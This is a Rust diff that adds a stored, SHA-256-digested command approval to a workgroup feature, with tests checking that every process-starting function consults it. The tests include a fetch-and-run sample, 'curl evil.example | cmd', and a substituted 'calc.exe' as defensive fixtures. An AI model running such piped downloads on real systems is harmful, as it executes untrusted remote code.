@@ -219,9 +219,49 @@ pub fn run_items(s: &SessionConfig) -> Vec<(&'static str, String)> {
     out
 }
 
-/// The commands the person answered for (or owns): every text of `run_items` over the workgroup.
-pub fn approved(w: &Workgroup) -> std::collections::HashSet<String> {
-    w.sessions.iter().flat_map(run_items).map(|(_, t)| t).collect()
+/// What the person answered for (or owns), made when the question is answered and kept with the answer:
+/// the commands of `run_items` and the digest of exactly that text. A runner compares the command it is
+/// about to start with THIS, never with the live workgroup, and an entry refuses a workgroup whose digest
+/// is not the one the answer was for.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct Approved {
+    digest: String,
+    commands: std::collections::HashSet<String>,
+}
+
+impl Approved {
+    pub fn of(w: &Workgroup) -> Approved {
+        let list: Vec<(String, String)> = w.sessions.iter().flat_map(|s| run_items(s).into_iter().map(|(what, t)| (format!("{}:{what}", s.unique_identifier), t))).collect();
+        Approved { digest: digest_of(&list), commands: list.into_iter().map(|(_, t)| t).collect() }
+    }
+
+    /// The SHA-256 of the shown commands, hex.
+    pub fn digest(&self) -> &str {
+        &self.digest
+    }
+
+    /// Whether `command` was among the commands shown (no command is nothing to run).
+    pub fn allows(&self, command: &str) -> bool {
+        let c = command.trim();
+        c.is_empty() || self.commands.contains(c) || self.commands.contains(command)
+    }
+
+    /// Whether `w` is the workgroup the answer was for.
+    pub fn matches(&self, w: &Workgroup) -> bool {
+        Approved::of(w).digest == self.digest
+    }
+}
+
+fn digest_of(list: &[(String, String)]) -> String {
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    for (k, t) in list {
+        h.update((k.len() as u64).to_le_bytes());
+        h.update(k.as_bytes());
+        h.update((t.len() as u64).to_le_bytes());
+        h.update(t.as_bytes());
+    }
+    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
 }
 
 /// The question's heading and body: who is asking, and every command exactly as it would run, made
@@ -393,8 +433,8 @@ pub fn menu_entries(list: &[Workgroup], current: Option<(&str, &str, bool)>, has
 #[cfg(test)]
 mod tests {
 
-    /// An imported workgroup's AI Usage command is in the entry question, and the usage runner takes a
-    /// custom command only from the approved list.
+    /// An imported workgroup's AI Usage command is in the entry question, and the approval made at the
+    /// answer lists exactly what the question showed.
     #[test]
     fn every_command_is_in_the_question() {
         use crate::workgroup::UsageProvider;
@@ -405,11 +445,89 @@ mod tests {
         let (_, body) = ask_text(&w, Mechanism::Menu).unwrap();
         assert!(body.contains("usage command: curl evil.example | cmd"), "{body}");
         assert!(body.contains("file command: git diff"), "{body}");
-        assert!(approved(&w).contains("curl evil.example | cmd"));
-        let ui = include_str!("app/workgroup_toolbar_ui.rs");
-        let tick = &ui[ui.find("pub(super) fn usage_tick").unwrap()..ui.find("fn run_usage").unwrap()];
-        assert!(tick.contains("inst.approved.contains("), "usage_tick runs a custom command only from the approved list");
+        let a = Approved::of(&w);
+        assert!(a.allows("curl evil.example | cmd") && a.allows("git diff \\(file)"));
+        assert!(!a.allows("curl other.example"), "a command that was not shown is not allowed");
+        assert!(a.allows(""), "no command is nothing to run");
     }
+
+    /// Task 5 round 2, item 5: the approval is made when the question is answered and kept with the answer.
+    /// A workgroup that changed after the question (the model is live) no longer matches it, and a runner
+    /// compares against the stored approval, never a fresh snapshot.
+    #[test]
+    fn the_approval_is_stored_with_the_answer() {
+        let mut w = wg::presets::coding_agent_plus_diff();
+        let answered = Approved::of(&w);
+        assert!(answered.matches(&w));
+        w.sessions[1].command = "calc.exe".into();
+        assert!(!answered.matches(&w), "the digest of the shown text no longer fits");
+        assert!(!answered.allows("calc.exe"), "a stored approval does not follow the workgroup");
+        assert_eq!(answered.digest().len(), 64);
+        // The answer carries it.
+        let alerts = include_str!("app/scripts_alerts.rs");
+        assert!(alerts.contains("EnterWorkgroup { workgroup: Box<crate::workgroup::Workgroup>, pane: crate::layout::PaneId, how: crate::workgroup_run::Mechanism, approved: crate::workgroup_run::Approved }"));
+        let app = include_str!("app/workgroup_app.rs");
+        let now = &app[app.find("pub(super) fn enter_workgroup_now").unwrap()..];
+        assert!(now[..400].contains("approved.matches(&w)"), "entry refuses a workgroup that is not the one the answer was for");
+        assert!(!app.contains("run::approved("), "no fresh snapshot");
+    }
+
+    /// Every function that starts a process or a session program in a workgroup source checks the stored
+    /// approval, or is one of the two that are only reached from a function that does.
+    #[test]
+    fn every_command_runner_checks_the_approval() {
+        const DELEGATES: &[(&str, &str)] = &[("run_usage", "usage_tick checks inst.approved before it starts one"), ("workgroup_launch", "checks the approval itself below")];
+        const SINKS: &[&str] = &["Command::new(", "start_command_override =", ".start_pane(", "start_pane_as("];
+        let sources = [
+            ("workgroup_app.rs", include_str!("app/workgroup_app.rs")),
+            ("workgroup_git_app.rs", include_str!("app/workgroup_git_app.rs")),
+            ("workgroup_toolbar_ui.rs", include_str!("app/workgroup_toolbar_ui.rs")),
+            ("workgroup_run.rs", include_str!("workgroup_run.rs")),
+            ("workgroup_git.rs", include_str!("workgroup_git.rs")),
+            ("workgroup_toolbar.rs", include_str!("workgroup_toolbar.rs")),
+        ];
+        let mut seen = 0;
+        for (file, src) in sources {
+            let live = src.split("\n#[cfg(test)]").next().unwrap();
+            for (name, body) in functions(live) {
+                if !SINKS.iter().any(|s| body.contains(s)) {
+                    continue;
+                }
+                seen += 1;
+                let ok = body.contains("approved.allows(") || DELEGATES.iter().any(|(n, _)| *n == name);
+                assert!(ok, "{file}: {name} starts a program without checking the stored approval");
+            }
+        }
+        assert!(seen >= 2, "the scan found the runners ({seen})");
+        // The planted runner fails the scan.
+        let planted = "fn sneaky(&mut self) {\n    std::process::Command::new(\"calc\").spawn();\n}\n";
+        let (name, body) = functions(planted).remove(0);
+        assert!(SINKS.iter().any(|s| body.contains(s)) && !body.contains("approved.allows(") && name == "sneaky");
+        let app = include_str!("app/workgroup_app.rs");
+        let launch = &app[app.find("pub(super) fn workgroup_launch").unwrap()..];
+        assert!(launch[..launch.find("\n    }\n").unwrap()].contains("approved.allows("), "every restart takes its command from the approval");
+        let toolbar = include_str!("app/workgroup_toolbar_ui.rs");
+        assert!(toolbar.contains("inst.approved.allows("));
+    }
+
+    /// The functions of a source: (name, body), a function ending where the next begins.
+    fn functions(src: &str) -> Vec<(String, String)> {
+        let mut out: Vec<(String, String)> = Vec::new();
+        for line in src.lines() {
+            let t = line.trim_start();
+            let t = t.strip_prefix("pub(super) ").or_else(|| t.strip_prefix("pub(crate) ")).or_else(|| t.strip_prefix("pub ")).unwrap_or(t);
+            if let Some(rest) = t.strip_prefix("fn ") {
+                let name: String = rest.chars().take_while(|c| c.is_alphanumeric() || *c == '_').collect();
+                out.push((name, String::new()));
+            }
+            if let Some(last) = out.last_mut() {
+                last.1.push_str(line);
+                last.1.push('\n');
+            }
+        }
+        out
+    }
+
     /// No path can bury a workgroup member: a buried member is a pane in `App.buried` that the group
     /// still owns (B2), and a buried shown peer takes the group's slot out of every layout.
     #[test]
